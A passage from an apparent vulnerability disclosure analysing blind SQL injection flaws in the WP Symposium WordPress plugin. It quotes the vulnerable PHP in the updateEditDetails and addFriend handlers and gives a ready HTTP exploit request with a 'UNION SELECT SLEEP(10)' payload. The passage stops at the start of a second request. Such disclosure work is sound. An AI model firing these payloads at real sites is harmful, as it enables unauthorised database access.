class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1657"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1658">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1659"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"\n"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">chr</span><span class="crayon-sy">(</span><span class="crayon-cn">13</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1660"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'topic_category'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1661">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a56d799761293-1662"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// Ensure safe HTML</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1663"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1664"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_subject</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1665"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">get_option</span><span class="crayon-sy">(</span><span class="crayon-s">'symposium_use_wysiwyg'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-s">'on'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1666"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;lt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1667"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_post</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">str_replace</span><span class="crayon-sy">(</span><span class="crayon-s">"&gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"&amp;gt;"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1668"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1669">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a56d799761293-1670"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1671"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$topic_category</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT topic_category FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">'symposium_topics'</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE tid = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1672"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1673">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a56d799761293-1674"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_topics SET topic_category = "</span><span class="crayon-sy">.</span><span class="crayon-v">$topic_category</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE topic_parent = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1675">&nbsp;</div><div class="crayon-line" id="crayon-53c987785a56d799761293-1676"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$sql</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"UPDATE "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_topics SET topic_subject = %s, topic_post = %s, topic_category = %d WHERE tid = %d"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1677"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">query</span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-v">$sql</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_subject</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_post</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$topic_category</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1678">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1679"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$parent</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT topic_parent FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">'symposium_topics'</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE tid = "</span><span class="crayon-sy">.</span><span class="crayon-v">$tid</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1680">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1681"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1682">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a56d799761293-1683"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">exit</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a56d799761293-1684"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0148 seconds] -->
<p>We can exploit it like this with anappropriateset of cookies:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987785a575693417226" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_forum_functions.php HTTP/1.0
Host: 192.168.80.130
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Cookie: wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1347997111%7Cbe07b25720d1c846b47c3dee37e9801d; 
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

action=updateEditDetails&amp;tid=1 UNION SELECT SLEEP(10)</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987785a575693417226-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a575693417226-2">2</div><div class="crayon-num" data-line="crayon-53c987785a575693417226-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a575693417226-4">4</div><div class="crayon-num" data-line="crayon-53c987785a575693417226-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a575693417226-6">6</div><div class="crayon-num" data-line="crayon-53c987785a575693417226-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a575693417226-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987785a575693417226-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_forum_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.0</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a575693417226-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c987785a575693417226-3"><span class="crayon-i">User</span><span class="crayon-o">-</span><span class="crayon-i">Agent</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">Mozilla</span><span class="crayon-o">/</span><span class="crayon-cn">5.0</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">Windows </span><span class="crayon-i">NT</span><span class="crayon-h"> </span><span class="crayon-cn">6.1</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">WOW64</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">rv</span><span class="crayon-o">:</span><span class="crayon-cn">13.0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-i">Gecko</span><span class="crayon-o">/</span><span class="crayon-cn">20100101</span><span class="crayon-h"> </span><span class="crayon-i">Firefox</span><span class="crayon-o">/</span><span class="crayon-cn">13.0.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a575693417226-4"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1347997111</span><span class="crayon-o">%</span><span class="crayon-cn">7Cbe07b25720d1c846b47c3dee37e9801d</span><span class="crayon-sy">;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c987785a575693417226-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a575693417226-6"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">53</span></div><div class="crayon-line" id="crayon-53c987785a575693417226-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a575693417226-8"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">updateEditDetails</span><span class="crayon-o">&amp;</span><span class="crayon-v">tid</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-e">SLEEP</span><span class="crayon-sy">(</span><span class="crayon-cn">10</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0039 seconds] -->
<p><strong>Analysis of profile addFriend blind SQL injection vulnerability</strong></p>
<p>A similar lack of input validation can be seen in the /ajax/symposium_profile_functions.php file in the addFriend action handling code. It takes in an ID for a friend to add and then starts putting together some SQL like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987785a57c411467989" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">PHP</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// Friend request made
if ($_POST['action'] == 'addFriend') {

	global $wpdb, $current_user;

	if (is_user_logged_in()) {

		$friend_from = $current_user-&gt;ID;
		$friend_to = $_POST['friend_to'];;					
		$friend_message = $_POST['friend_message'];

		// check that request isn't already there
		if ( $wpdb-&gt;get_var($wpdb-&gt;prepare("SELECT * FROM ".$wpdb-&gt;base_prefix."symposium_friends WHERE (friend_from = ".$friend_to." AND friend_to = ".$current_user-&gt;ID." OR friend_to = ".$friend_to." AND friend_from = ".$current_user-&gt;ID.")")) ) {
			// already exists
		} else {</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c987785a57c411467989-1547">1547</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a57c411467989-1548">1548</div><div class="crayon-num" data-line="crayon-53c987785a57c411467989-1549">1549</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a57c411467989-1550">1550</div><div class="crayon-num" data-line="crayon-53c987785a57c411467989-1551">1551</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a57c411467989-1552">1552</div><div class="crayon-num" data-line="crayon-53c987785a57c411467989-1553">1553</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a57c411467989-1554">1554</div><div class="crayon-num" data-line="crayon-53c987785a57c411467989-1555">1555</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a57c411467989-1556">1556</div><div class="crayon-num" data-line="crayon-53c987785a57c411467989-1557">1557</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a57c411467989-1558">1558</div><div class="crayon-num" data-line="crayon-53c987785a57c411467989-1559">1559</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c987785a57c411467989-1560">1560</div><div class="crayon-num" data-line="crayon-53c987785a57c411467989-1561">1561</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c987785a57c411467989-1547"><span class="crayon-c">// Friend request made</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a57c411467989-1548"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'addFriend'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a57c411467989-1549">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a57c411467989-1550"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">$current_user</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a57c411467989-1551">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a57c411467989-1552"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c987785a57c411467989-1553">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a57c411467989-1554"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_from</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a57c411467989-1555"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_to</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'friend_to'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a57c411467989-1556"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">$friend_message</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">$_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'friend_message'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c987785a57c411467989-1557">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a57c411467989-1558"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// check that request isn't already there</span></div><div class="crayon-line" id="crayon-53c987785a57c411467989-1559"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">prepare</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-v">$wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-i">base_prefix</span><span class="crayon-sy">.</span><span class="crayon-s">"symposium_friends WHERE (friend_from = "</span><span class="crayon-sy">.</span><span class="crayon-v">$friend_to</span><span class="crayon-sy">.</span><span class="crayon-s">" AND friend_to = "</span><span class="crayon-sy">.</span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">" OR friend_to = "</span><span class="crayon-sy">.</span><span class="crayon-v">$friend_to</span><span class="crayon-sy">.</span><span class="crayon-s">" AND friend_from = "</span><span class="crayon-sy">.</span><span class="crayon-v">$current_user</span><span class="crayon-o">-&gt;</span><span class="crayon-cn">ID</span><span class="crayon-sy">.</span><span class="crayon-s">")"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c987785a57c411467989-1560"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// already exists</span></div><div class="crayon-line" id="crayon-53c987785a57c411467989-1561"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0054 seconds] -->
<p>Notice that it simply concatenates the $friend_to variable into the query. While this query is not used for output, we can still do a blind SQL injection if we&#8217;re logged in.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c987785a583740292718" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_profile_functions.php HTTP/1.0
